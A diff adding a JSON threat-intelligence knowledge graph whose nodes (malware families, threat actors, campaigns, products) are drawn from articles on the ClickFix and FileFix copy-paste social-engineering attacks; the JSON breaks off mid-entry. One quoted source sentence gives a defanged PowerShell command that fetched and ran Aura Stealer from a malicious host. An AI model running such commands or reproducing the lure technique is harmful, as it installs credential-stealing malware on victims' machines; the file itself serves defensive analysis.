@@ -1,0 +1,2948 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0016d7882d5f",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Cloudflare Tunnel",
+        "edges": [
+          "EDGE_3191a370f999"
+        ],
+        "source": {
+          "Cloudflare Tunnel_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              34,
+              "This malware version used Cloudflare Tunnel URLs for stealthy Command and Control (C2) and stored itself as php.exe under AppData for persistence."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0a7746ddf147",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Atomic macOS Stealer",
+        "edges": [],
+        "source": {
+          "Atomic macOS Stealer_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              10,
+              "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+            ]
+          ],
+          "AMOS_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              10,
+              "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+            ]
+          ]
+        },
+        "alias": [
+          "AMOS"
+        ]
+      },
+      {
+        "node_id": "HL_1a612db4ac86",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "finger.exe",
+        "edges": [
+          "EDGE_57a79c091289",
+          "EDGE_cf1fecc44522"
+        ],
+        "source": {
+          "finger.exe_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              46,
+              "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_274adb6e9380",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "r77 variants",
+        "edges": [
+          "EDGE_1dd54a53add6"
+        ],
+        "source": {
+          "r77 variants_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_278f20c040bf",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "KongTuke",
+        "edges": [],
+        "source": {
+          "KongTuke_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              31,
+              "Researchers discovered a FileFix-based campaign distributing Interlock RAT, tied to the KongTuke threat cluster."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2fa87035e3b8",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Ukrainian government agencies",
+        "edges": [
+          "EDGE_110c69729e41"
+        ],
+        "source": {
+          "Ukrainian government agencies_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              25,
+              "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_428fc2608140",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "FileFix",
+        "edges": [
+          "EDGE_11aaaa1d3f34",
+          "EDGE_86df8f4af142"
+        ],
+        "source": {
+          "FileFix_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              2,
+              "Moreover, a new variation called FileFix has emerged – a stealthier evolution that uses Windows File Explorer, showing how quickly threat actors are adapting ClickFix-style deception into even subtler forms."
+            ],
+            [
+              20,
+              "Building on the success of ClickFix, cybercriminals have begun testing another deceptive technique: FileFix."
+            ],
+            [
+              21,
+              "First revealed by security researcher mr.d0x in June 2025, FileFix shifts the attack surface from the Windows Run dialog to the Windows File Explorer address bar."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [
+          "EDGE_098611420873",
+          "EDGE_5c80a811f00e"
+        ],
+        "source": {
+          "Windows_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              29,
+              "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+            ]
+          ],
+          "Windows_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              2,
+              "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+            ],
+            [
+              8,
+              "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_49884b2b2c2e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Microsoft",
+        "edges": [],
+        "source": {
+          "Microsoft_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              43,
+              "Furthermore, Microsoft’s researchers found that ClickFix is also sold as a cybercrime service."
+            ],
+            [
+              44,
+              "In early February 2026, Microsoft published new research on a ClickFix evolution dubbed CrashFix, which combines browser disruption with social engineering to increase execution success."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4d4a1f8476fb",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Zoom",
+        "edges": [],
+        "source": {
+          "Zoom_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              26,
+              "Victims received fake Zoom invitations leading to sites that displayed a bogus CAPTCHA."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5100a6ad379b",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Spectrum",
+        "edges": [
+          "EDGE_67f2ee8dd6f1"
+        ],
+        "source": {
+          "Spectrum_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              10,
+              "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_514a571a8043",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft 365",
+        "edges": [],
+        "source": {
+          "Microsoft 365_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              29,
+              "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5263b8dc8ecf",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Lumma",
+        "edges": [],
+        "source": {
+          "Lumma_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5fb6d8e856e0",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Interlock RAT",
+        "edges": [
+          "EDGE_04930fc18d9e",
+          "EDGE_5641ce26a10e",
+          "EDGE_b1dd59f20743"
+        ],
+        "source": {
+          "Interlock RAT_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              31,
+              "Researchers discovered a FileFix-based campaign distributing Interlock RAT, tied to the KongTuke threat cluster."
+            ],
+            [
+              33,
+              "When users followed instructions to paste copied text into the Run command, the injected PowerShell script installed the Interlock RAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_60867dc6d2af",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "COLDRIVER",
+        "edges": [],
+        "source": {
+          "COLDRIVER_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              28,
+              "Investigators linked the campaign to Russian infrastructure and the Star Blizzard (COLDRIVER) espionage group, showing that nation-state actors are also weaponizing ClickFix techniques."
+            ]
+          ],
+          "Star Blizzard_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              28,
+              "Investigators linked the campaign to Russian infrastructure and the Star Blizzard (COLDRIVER) espionage group, showing that nation-state actors are also weaponizing ClickFix techniques."
+            ]
+          ]
+        },
+        "alias": [
+          "Star Blizzard"
+        ]
+      },
+      {
+        "node_id": "HL_6f65f0e48abe",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "WinPython",
+        "edges": [
+          "EDGE_450848c5a7e3"
+        ],
+        "source": {
+          "WinPython_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              47,
+              "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_7404055402f9",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "MuddyWater",
+        "edges": [],
+        "source": {
+          "MuddyWater_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              42,
+              "Researchers have observed APT groups such as MuddyWater and APT28 adopting ClickFix-style lures in targeted operations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_76eb9cf74211",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "APT28",
+        "edges": [],
+        "source": {
+          "APT28_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              42,
+              "Researchers have observed APT groups such as MuddyWater and APT28 adopting ClickFix-style lures in targeted operations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_77b792a2ed60",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "ClearFix",
+        "edges": [
+          "EDGE_235e3e47236e",
+          "EDGE_25387f639307",
+          "EDGE_2e25f714f4b2",
+          "EDGE_66ae7a784c7b",
+          "EDGE_8eda8fb1b0fd"
+        ],
+        "source": {
+          "ClearFix_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              3,
+              "First seen in October 2023 and spreading rapidly by late 2024, ClickFix (also known as ClearFix) is a modern evolution of phishing."
+            ]
+          ],
+          "ClickFix_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              3,
+              "First seen in October 2023 and spreading rapidly by late 2024, ClickFix (also known as ClearFix) is a modern evolution of phishing."
+            ],
+            [
+              5,
+              "ClickFix sidesteps both by convincing users to execute commands themselves, transforming a cautious habit into an exploitable behavior."
+            ],
+            [
+              13,
+              "Each of these channels leads users to a deceptive landing page that hosts the ClickFix lure."
+            ]
+          ]
+        },
+        "alias": [
+          "ClickFix"
+        ]
+      },
+      {
+        "node_id": "HL_7c91dad1d951",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Red Cross",
+        "edges": [],
+        "source": {
+          "Red Cross_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              25,
+              "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_801e74666fa8",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Photoshop",
+        "edges": [],
+        "source": {
+          "Photoshop_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              29,
+              "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8adbaf31fb92",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "PhantomCaptcha",
+        "edges": [
+          "EDGE_1fe156c439a3"
+        ],
+        "source": {
+          "PhantomCaptcha_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              25,
+              "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9238de66bf3f",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows Run dialog",
+        "edges": [],
+        "source": {
+          "Windows Run dialog_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              21,
+              "First revealed by security researcher mr.d0x in June 2025, FileFix shifts the attack surface from the Windows Run dialog to the Windows File Explorer address bar."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a6118de3a56b",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Facebook",
+        "edges": [],
+        "source": {
+          "Facebook_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              35,
+              "A FileFix campaign was disguised as Facebook security alerts claiming users’ accounts were at risk of suspension."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a81bc98d80e7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PowerShell",
+        "edges": [],
+        "source": {
+          "PowerShell_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              6,
+              "When users follow the “fix” instructions and paste it into their Run, Terminal, or PowerShell window, they unknowingly execute the attacker’s code."
+            ],
+            [
+              27,
+              "Copying and pasting the provided token launched PowerShell commands that installed a WebSocket RAT capable of live remote access."
+            ],
+            [
+              46,
+              "The campaign abuses native Windows tools, including finger.exe (renamed to evade detection), to retrieve obfuscated PowerShell payloads."
+            ]
+          ],
+          "PowerShell_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              11,
+              "This command is a multi-stage PowerShell script that downloads the aforementioned image, decodes it into the next-stage payload, and ultimately runs a Go-based loader that unpacks shellcode responsible for launching StealC."
+            ],
+            [
+              14,
+              "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b07e83768d2c",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "macOS",
+        "edges": [],
+        "source": {
+          "macOS_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              9,
+              "While it began on Windows, attackers have adapted lures for macOS."
+            ],
+            [
+              10,
+              "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b3f68f53b084",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Latrodectus",
+        "edges": [],
+        "source": {
+          "Latrodectus_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ba4263cd3b62",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MintsLoader",
+        "edges": [],
+        "source": {
+          "MintsLoader_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bdf969431e42",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "U.S.",
+        "edges": [],
+        "source": {
+          "U.S._ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              10,
+              "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c0511d4808e2",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "ModeloRAT",
+        "edges": [
+          "EDGE_1f116259609e",
+          "EDGE_5d1cbdc3203c",
+          "EDGE_65d5334f5ad1",
+          "EDGE_8e24cfdfe53d"
+        ],
+        "source": {
+          "ModeloRAT_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              47,
+              "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c458c0a70a9d",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "CrashFix",
+        "edges": [
+          "EDGE_042c6a1c2f2b",
+          "EDGE_1a204ed603fe",
+          "EDGE_2de65a6c493a",
+          "EDGE_3d4dc7d99b13",
+          "EDGE_5f939d7a6656",
+          "EDGE_9aebf9efad1a",
+          "EDGE_c28a71e563ff",
+          "EDGE_d83af50301a1"
+        ],
+        "source": {
+          "CrashFix_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              44,
+              "In early February 2026, Microsoft published new research on a ClickFix evolution dubbed CrashFix, which combines browser disruption with social engineering to increase execution success."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c5f16d4cfd6c",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Aura",
+        "edges": [
+          "EDGE_071e020f9234",
+          "EDGE_4c6429021270"
+        ],
+        "source": {
+          "Aura_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ],
+            [
+              30,
+              "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_cfaa8a8d0cb8",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "UNICEF",
+        "edges": [],
+        "source": {
+          "UNICEF_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              25,
+              "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ee5c1329124a",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "NetSupport",
+        "edges": [
+          "EDGE_ed231a5f7cec"
+        ],
+        "source": {
+          "NetSupport_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              19,
+              "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f0c28078d330",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Spotify Premium",
+        "edges": [],
+        "source": {
+          "Spotify Premium_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              29,
+              "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f1c8d8dcd823",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "TikTok",
+        "edges": [],
+        "source": {
+          "TikTok_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              29,
+              "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_fde5e6472d67",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Chrome",
+        "edges": [
+          "EDGE_41224f39f46d",
+          "EDGE_8cf03ee92f40"
+        ],
+        "source": {
+          "Chrome_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              45,
+              "According to Microsoft’s analysis, attackers distribute a malicious Chrome extension masquerading as a legitimate ad blocker."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1385cae28d95",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Bitbucket",
+        "edges": [
+          "EDGE_e25463db7097",
+          "EDGE_226c4d6f4883"
+        ],
+        "source": {
+          "Bitbucket_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              2,
+              "At a high level, the attack chain involves the use of FileFix to entice users into launching an initial payload that then proceeds to download seemingly innocuous images containing the malicious components from a Bitbucket repository."
+            ]
+          ],
+          "Bitbucket_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              11,
+              "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_180c8dd484f7",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "StealC",
+        "edges": [
+          "EDGE_db31874291c7",
+          "EDGE_287300b46ec8",
+          "EDGE_2ddf7213b853",
+          "EDGE_f213d30736e4"
+        ],
+        "source": {
+          "StealC_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              0,
+              "Cybersecurity researchers have warned of a new campaign that's leveraging a variant of the FileFix social engineering tactic to deliver the StealC information stealer malware."
+            ],
+            [
+              11,
+              "This command is a multi-stage PowerShell script that downloads the aforementioned image, decodes it into the next-stage payload, and ultimately runs a Go-based loader that unpacks shellcode responsible for launching StealC."
+            ]
+          ],
+          "StealC_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              0,
+              "A newly discovered FileFix social engineering attack impersonates Meta account suspension warnings to trick users into unknowingly installing the StealC infostealer malware."
+            ]
+          ],
+          "StealC v2_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              37,
+              "The payload chain dropped AI-generated images embedded with hidden PowerShell scripts that installed StealC v2, a powerful stealer malware capable of stealing credentials, crypto wallets, and VPN data."
+            ]
+          ]
+        },
+        "alias": [
+          "StealC v2"
+        ]
+      },
+      {
+        "node_id": "HL_335595ae46cd",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "MSHTA",
+        "edges": [
+          "EDGE_3c804ff82e3c",
+          "EDGE_580af8f540cf",
+          "EDGE_cebc593e3936",
+          "EDGE_fca7cd8a6086"
+        ],
+        "source": {
+          "MSHTA_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              16,
+              "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4cc5ab71f383",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "FileFix",
+        "edges": [
+          "EDGE_45313f61ddb3",
+          "EDGE_6a44163a2a9f",
+          "EDGE_7a558495399a"
+        ],
+        "source": {
+          "FileFix_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              0,
+              "Cybersecurity researchers have warned of a new campaign that's leveraging a variant of the FileFix social engineering tactic to deliver the StealC information stealer malware."
+            ],
+            [
+              2,
+              "At a high level, the attack chain involves the use of FileFix to entice users into launching an initial payload that then proceeds to download seemingly innocuous images containing the malicious components from a Bitbucket repository."
+            ],
+            [
+              4,
+              "FileFix, first documented by security researcher mrd0x as a proof-of-concept (PoC) in June 2025, is a little different from ClickFix in that it eschews the need for users to launch the Windows Run dialog and paste an already copied obfuscated command to complete bogus CAPTCHA verification checks on phishing pages set up for this purpose."
+            ],
+            [
+              5,
+              "Instead, it leverages a web browser's file upload feature to deceive users into copying and pasting a command on the File Explorer's address bar, causing it to be executed locally on the victim's machine."
+            ],
+            [
+              9,
+              "The FileFix attack comes into play once the button is clicked, at which point the victim is displayed a message stating they can access a PDF version of the supposed policy violation by copying and pasting a path to the document in the File Explorer's address bar."
+            ],
+            [
+              12,
+              "FileFix also offers a crucial advantage over ClickFix, as it abuses a widely used browser feature as opposed to opening the Run dialog (or the Terminal app in case of Apple macOS), which could be blocked by a system administrator as a security measure."
+            ],
+            [
+              13,
+              "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said."
+            ]
+          ],
+          "FileFix_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              0,
+              "A newly discovered FileFix social engineering attack impersonates Meta account suspension warnings to trick users into unknowingly installing the StealC infostealer malware."
+            ],
+            [
+              1,
+              "FileFix is a new variant of the ClickFix family of attacks, which uses social engineering attacks to trick users into pasting malicious commands into operating system dialog boxes as supposed \"fixes\" for problems."
+            ],
+            [
+              2,
+              "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+            ],
+            [
+              3,
+              "This is not the first time FileFix has been used in attacks, with the Interlock ransomware gang previously using FileFix to install its remote access trojan (RAT)."
+            ],
+            [
+              4,
+              "However, these earlier attacks utilized the original FileFix proof-of-concept (PoC), rather than evolving it with new lures."
+            ],
+            [
+              11,
+              "In an average ClickFix attack, this is done using the # symbol instead of a variable, which is taken by PowerShell as a developer comment.\"\n\"This has the unintentional advantage that anyone who has built their detections to look for the \"#\" symbol from ClickFix, is likely to miss this.\"\nThis FileFix campaign stands out as it uses steganography to hide both a second-stage PowerShell script and encrypted executables inside what appears to be a harmless JPG image hosted on Bitbucket."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_548f85d138f6",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cloudflare",
+        "edges": [],
+        "source": {
+          "Cloudflare_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              14,
+              "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_56189a86e5cf",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Acronis",
+        "edges": [],
+        "source": {
+          "Acronis_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              1,
+              "\"The observed campaign uses a highly convincing, multilingual phishing site (e.g., fake Facebook Security page), with anti-analysis techniques and advanced obfuscation to evade detection,\" Acronis security researcher Eliad Kimhy said in a report shared with The Hacker News."
+            ],
+            [
+              13,
+              "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said."
+            ]
+          ],
+          "Acronis_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": [
+            [
+              5,
+              "The new campaign, discovered by Acronis, uses a multi-language phishing page that poses as Meta's support team, warning recipients that their account will be disabled in seven days unless they view an \"incident report\" allegedly shared by Meta."
+            ],
+            [
+              9,
+              "\"In order to trick the user into thinking that they are pasting the path to an 'incident report' PDF file, the attacker has placed a variable at the end of the payload, which contains a lot of spaces and the fake path at the end,\" explains Acronis."
+            ],
+            [
+              13,
+              "Acronis reports that multiple variants of this campaign were observed over two weeks, using different payloads, domains, and lures."
+            ],
+            [
+              14,
